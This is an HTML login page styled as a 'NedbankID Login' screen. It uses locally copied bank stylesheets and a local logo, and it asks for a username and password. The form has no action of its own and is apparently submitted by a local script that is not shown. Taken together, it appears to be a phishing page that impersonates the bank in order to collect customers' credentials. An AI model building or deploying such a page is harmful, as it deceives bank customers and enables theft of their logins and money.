<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Login</title>
        <!--styles -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
        <link rel="stylesheet" href="resources/css/nedbank.css" />
        <link rel="stylesheet" href="resources/css/main.css" />
    </head>
    <body>
        
        <div class="container-fluid" style="padding-top:10px;">
            <div class="row">
                <div class="col-lg-4 col-sm-4 col-md-4 col-2"><img src="resources/img/logo.svg" width="30px" alt="NedbankID" /></div>
                <div class="col-lg-8 col-md-8 col-sm-8 col-10 justify-content-end"><h5>NedbankID Login</h5></div>
            </div>
            <hr class="nlsg-c-divider" style="margin: 10px auto 10px auto;border-color:#aaa;margin-bottom:0px;">
            <div class="row">
                <div class="col-12">
                    <div class="form_cont">
                        <form class="nlsg-c-form-element" id="log_form">
                            <div class="nlsg-c-form-element__form-group">
                                <label class="nlsg-c-form-element__label" for="input-field-primary">Username</label>
                                <input class="" name="username" type="text">
                            </div>
                            <div class="nlsg-c-form-element__form-group">
                                <label class="nlsg-c-form-element__label" for="input-field-primary">Password</label>
                                <input class="" name="password" type="password">
                            </div>
                            <small>By logging in you accept the <a href="https://www.nedbank.co.za/terms" target="_blank">terms &amp; conditions</a></small>
                            <button class="nlsg-c-button" type="submit">Login</button>
                        </form>
                    </div>
                </div>
            </div>
            
        </div>

        <!--scripts -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
        <script src="resources/js/main.js"></script>
        
    </body>
</html>
